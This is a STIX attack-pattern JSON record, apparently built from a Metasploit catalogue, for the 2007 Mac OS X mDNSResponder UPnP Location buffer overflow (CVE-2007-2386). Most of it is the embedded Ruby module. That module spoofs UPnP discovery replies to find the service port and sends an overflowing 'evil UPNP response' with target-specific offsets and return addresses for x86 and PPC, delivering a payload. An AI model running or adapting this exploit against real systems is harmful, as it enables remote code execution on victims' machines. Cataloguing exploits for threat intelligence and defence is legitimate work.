{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--74ce61d9-70c9-4001-adf5-b8afaf96de6a",
    "created": "2024-08-14T16:34:15.308006Z",
    "modified": "2024-08-14T16:34:15.30801Z",
    "name": "Mac OS X mDNSResponder UPnP Location Overflow",
    "description": " This module exploits a buffer overflow that occurs when processing specially crafted requests set to mDNSResponder. All Mac OS X systems between version 10.4 and 10.4.9 (without the 2007-005 patch) are affected.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/mdns/upnp_location.rb",
            "external_id": "upnp_location.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2386"
        },
        {
            "source_name": "reference",
            "url": "http://support.apple.com/kb/TA24732"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Mac OS X mDNSResponder UPnP Location Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow that occurs when processing\n        specially crafted requests set to mDNSResponder. All Mac OS X systems\n        between version 10.4 and 10.4.9 (without the 2007-005 patch) are\n        affected.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'ddz'\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '35142' ],\n          [ 'CVE', '2007-2386' ],\n          [ 'BID', '24144' ],\n          [ 'URL', 'http://support.apple.com/kb/TA24732' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'SRVPORT' => 1900,\n          'RPORT' => 0\n        },\n      'Payload' =>\n        {\n          'BadChars' => \"\\x00\\x3a\\x2f\",\n          'StackAdjustment' => 0,\n          'Space' => 468\n        },\n      'Platform' => 'osx',\n      'Targets' =>\n        [\n          [ '10.4.8 x86',\n            { # mDNSResponder-108.2\n              'Arch'                   => ARCH_X86,\n              # Offset to mDNSStorage structure\n              'Offset'                 => 21000,\n              'Magic'                  => 0x8fe510a0,\n              'g_szRouterHostPortDesc' => 0x53dc0,\n            }\n          ],\n          [ '10.4.0 PPC',\n            { # mDNSResponder-107\n              'Arch'    => ARCH_PPC,\n              'Offset'  => 21000,\n              'Magic'   => 0x8fe51f4c,\n              'Ret'     => 0x8fe41af8,\n            }\n          ]\n        ],\n      'DisclosureDate' => '2007-05-25',\n      'DefaultTarget' => 1))\n\n    register_options(\n      [\n        Opt::LHOST(),\n        OptPort.new('SRVPORT', [ true, \"The UPNP server port to listen on\", 1900 ])\n      ])\n\n    @mutex = Mutex.new()\n    @found_upnp_port = false\n    @key_to_port = Hash.new()\n    @upnp_port = 0\n    @client_socket = nil\n  end\n\n  def check\n    #\n    # TODO: Listen on two service ports, one a single character\n    # shorter than the other (i.e 1900 and 19000).  If the copy was\n    # truncated by strlcpy, it will connect to the service listening\n    # on the shorter port number.\n    #\n    upnp_port = scan_for_upnp_port()\n    if (upnp_port > 0)\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Unsupported\n    end\n  end\n\n  def upnp_server(server)\n    client = server.accept()\n    request = client.readline()\n    if (request =~ /GET \\/([\\da-f]+).xml/)\n      @mutex.synchronize {\n        @found_upnp_port = true\n        @upnp_port = @key_to_port[$1]\n\n        # Important: Keep the client connection open\n        @client_socket = client\n      }\n    end\n  end\n\n  def scan_for_upnp_port\n    @upnp_port = 0\n    @found_upnp_port = false\n\n    upnp_port = 0\n\n    # XXX: Do this in a more Metasploit-y way\n    server = TCPServer.open(1900)\n    server_thread = framework.threads.spawn(\"Module(#{self.refname})-Listener\", false) { self.upnp_server(server) }\n\n    begin\n      socket = Rex::Socket.create_udp\n\n      upnp_location = \"http://\" + datastore['LHOST'] + \":\" + datastore['SRVPORT'].to_s\n\n      print_status(\"Listening for UPNP requests on: #{upnp_location}\")\n      print_status(\"Sending UPNP Discovery replies...\")\n\n      i = 49152;\n      while i < 65536 && @mutex.synchronize {\n        @found_upnp_port == false\n      }\n      key = sprintf(\"%.2x%.2x%.2x%.2x%.2x\",\n        rand(255), rand(255), rand(255), rand(255), rand(255))\n\n      @mutex.synchronize {\n        @key_to_port[key] = i\n      }\n\n      upnp_reply = \"HTTP/1.1 200 Ok\\r\\n\" +\n        \"ST: urn:schemas-upnp-org:service:WANIPConnection:1\\r\\n\" +\n        \"USN: uuid:7076436f-6e65-1063-8074-0017311c11d4\\r\\n\" +\n        \"Location: #{upnp_location}/#{key}.xml\\r\\n\\r\\n\"\n\n      socket.sendto(upnp_reply, datastore['RHOST'], i)\n\n      i += 1\n    end\n\n    @mutex.synchronize {\n      if (@found_upnp_port)\n        upnp_port = @upnp_port\n      end\n    }\n    ensure\n      server.close\n      server_thread.join\n    end\n\n    return upnp_port\n  end\n\n  def exploit\n    #\n    # It is very important that we scan for the upnp port.  We must\n    # receive the TCP connection and hold it open, otherwise the\n    # code path that uses the overwritten function pointer most\n    # likely won't be used.  Holding this connection increases the\n    # chance that the code path will be used dramatically.\n    #\n    upnp_port = scan_for_upnp_port()\n\n    if upnp_port == 0\n      fail_with(Failure::Unreachable, \"Could not find listening UPNP UDP socket\")\n    end\n\n    datastore['RPORT'] = upnp_port\n\n    socket = connect_udp()\n\n    if (target['Arch'] == ARCH_X86)\n      space = \"A\" * target['Offset']\n      space[0, payload.encoded.length] = payload.encoded\n\n      pattern = Rex::Text.pattern_create(47)\n      pattern[20, 4] = [target['Magic']].pack('V')\n      pattern[44, 3] = [target['g_szRouterHostPortDesc']].pack('V')[0..2]\n\n      boom = space + pattern\n      usn = \"\"\n\n    elsif (target['Arch'] == ARCH_PPC)\n      space = \"A\" * target['Offset']\n\n      pattern = Rex::Text.pattern_create(48)\n      pattern[20, 4] = [target['Magic']].pack('N')\n\n      #\n      # r26, r27, r30, r31 point to g_szUSN+556\n      # Ret should be a branch to one of these registers\n      # And we make sure to put our payload in the USN header\n      #\n      pattern[44, 4] = [target['Ret']].pack('N')\n\n      boom = space + pattern\n\n      #\n      # Start payload at offset 556 within USN\n      #\n      usn = \"A\" * 556 + payload.encoded\n    end\n\n    upnp_reply = \"HTTP/1.1 200 Ok\\r\\n\" +\n      \"ST: urn:schemas-upnp-org:service:WANIPConnection:1\\r\\n\" +\n      \"USN: #{usn}\\r\\n\" +\n      \"Location: http://#{boom}\\r\\n\\r\\n\"\n\n    print_status(\"Sending evil UPNP response\")\n    socket.put(upnp_reply)\n\n    print_status(\"Sleeping to give mDNSDaemonIdle() a chance to run\")\n    select(nil,nil,nil,10)\n\n    handler()\n    disconnect_udp()\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-05-25",
    "x_mitre_platforms": [
        "osx'"
    ]
}